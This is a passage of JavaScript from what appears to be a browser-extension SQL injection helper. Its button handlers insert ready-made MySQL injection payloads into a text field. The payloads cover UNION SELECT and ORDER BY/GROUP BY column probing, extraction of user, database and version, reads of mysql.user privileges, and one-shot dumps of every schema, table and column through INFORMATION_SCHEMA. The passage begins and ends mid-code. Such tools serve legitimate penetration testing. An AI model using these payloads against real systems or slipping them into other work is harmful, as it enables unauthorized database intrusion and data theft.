				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = str.split("").reverse().join("") ;				

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);

 				var end_selection_after = start+final1.length;
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);


// 				document.cookie="mydata=";
		});
	});

	$('#ordrby').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var start1 = start;
				if(str == '')
				{
					var str = window.prompt('Enter the number of columns','String to use');
					var start1 = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

			    var hello1 = str;
			    var text = str;

	    		start = -1;
	    		var check = 0;
	    		var string = '+ORDER+BY+';
	    		for(i=0;i<hello1.length;i++)
	    		{
	    			var substr = text.substring(i,i+1);
//	    			alert(substr);
	    			if(substr == ' ')
	    			{
//	    				alert(i);
//						var sub = text.substring(start,i);
//		    			start = i;
//	    				var string = sub.replace(' ','/**/');

						var qwe = text.substring(start+1,i);

						start = i;
//						alert(qwe);
//						qwe = qwe.replace(' ','/**/');
//						alert(qwe);
						string += qwe+'/**/';
//						alert(string);

	    				check = 1;
	    				var end = text.substring(i+1);
//	    				alert(end);
	    			}

	    		}

	    		if(check == 0)
	    		{
	    			end = hello1;
	    		}

//	    		alert(string);
	    		final1 = string+end;
//	    		alert(final1);
//	    		string = string + end;
//	    		alert(string);
//	    		document.cookie="mydata="+escape(string);
//	    		$('#text_field').prop('value',string);

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start1+final1.length;
// 				alert(start1+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start1, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#grpby').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var number = prompt("Enter the number of columns");

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
//s					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var number_cols = '';
				for(i=1;i<=number;i++)
				{
					if(i==number)
					{
						number_cols += i;
					}
					else
					{
						number_cols += i+',';
					}
				}

				var f1 = '+GROUP+BY+';

				var final1 = f1+number_cols;

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	
	$('#prcdr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+PROCEDURE+ANALYSE()';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
		
	});
	
	$('#slctfrm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'+AND+(SELECT * FROM +PROCEDURE+ANALYSE())=(SELECT 1)--+";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#intp').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var number = prompt("Enter the number of columns");

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
//s					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var number_cols = '';
				for(i=1;i<=number;i++)
				{
					if(i==number)
					{
						number_cols += i;
					}
					else
					{
						number_cols += i+',';
					}
				}

				var f1 = '+UNION+ALL+SELECT+';

				var final1 = f1+number_cols;

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#intn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var number = prompt("Enter the number of columns");

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
//s					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var number_cols = '';
				for(i=1;i<=number;i++)
				{
					if(i==number)
					{
						number_cols += i;
					}
					else
					{
						number_cols += i+',';
					}
				}

				var f1 = ' Union Select ';

				var final1 = f1+number_cols;

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#nulluc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+UNION+ALL+SELECT+null,null,null,null,null,null,null,null,null,null--+-';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#nullb').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#usrdv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#cdtbs').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#isprvlg').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#prvlgt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#rnnq').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dbgrpcnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dbgrpos').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#tblgrpc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#tblon').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#clmngrc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=OWN_TABLE_NAME_HEX)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#clmnon').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=OWN_TABLE_NAME_HEX)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dtexgrpc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+GROUP_CONCAT(column_1,column_2,column_3+SEPARATOR+0x3c62723e)+FROM+OWN_TABLE_NAME)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dtexos').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(OWN_TABLE_NAME)WHERE(@x)IN(@x:=CONCAT(0x20,@x,column_1,column_2,column_3,0x3c62723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmnmdbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmtpro').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmdrzr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmzen').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmajkr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmrmm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmshrf').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmhllr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
